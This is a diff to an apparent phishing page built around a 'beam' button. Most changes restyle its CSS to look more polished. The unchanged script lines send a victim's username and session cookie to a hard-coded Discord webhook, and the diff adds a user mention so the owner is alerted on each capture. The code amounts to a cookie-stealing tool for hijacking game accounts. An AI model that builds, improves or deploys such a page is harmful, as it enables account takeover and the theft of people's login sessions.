@@ -12,8 +12,9 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
+            color: #333;
         }
         #beamButtonContainer {
             display: flex;
@@ -23,26 +24,28 @@
             transition: opacity 0.5s;
         }
         #beamButton {
-            background-color: #007bff;
+            background: linear-gradient(135deg, #1e90ff, #00bfff);
             color: white;
             padding: 30px 60px;
             border: none;
             border-radius: 15px;
             font-size: 36px;
             cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             transition: background-color 0.3s, transform 0.3s;
             margin-bottom: 10px;
         }
         #beamButton:hover {
-            background-color: #0056b3;
+            background: linear-gradient(135deg, #1e80e0, #00a5cc);
         }
         #beamButton:active {
             transform: scale(0.95);
         }
         #description {
             font-size: 24px;
-            color: #333;
+            color: #fff;
             font-weight: bold;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
         }
         #inputContainer {
             display: none;
@@ -50,7 +53,7 @@
             background-color: white;
             padding: 20px;
             border-radius: 15px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
             opacity: 0;
             transition: opacity 0.5s;
         }
@@ -80,17 +83,18 @@
             outline: none;
         }
         button {
-            background-color: #007bff;
+            background: linear-gradient(135deg, #1e90ff, #00bfff);
             color: white;
             padding: 10px 20px;
             border: none;
             border-radius: 10px;
             cursor: pointer;
             font-size: 16px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #0056b3;
+            background: linear-gradient(135deg, #1e80e0, #00a5cc);
         }
     </style>
 </head>
@@ -134,7 +138,7 @@
             if (username && cookie) {
                 const webhookUrl = 'https://discord.com/api/webhooks/1252706909656449145/mug143mFHQ8XQYQtda0oLy5h56M2SmXkGmXrIPyOOg_1f5QOkVS7TQM681bMq28Dtz1_';
                 const payload = {
-                    content: '**!!BEAM ALERT!!**',
+                    content: '<@1093924846460739664> **!!BEAM ALERT!!**',
                     embeds: [
                         {
                             title: "Player's Username",
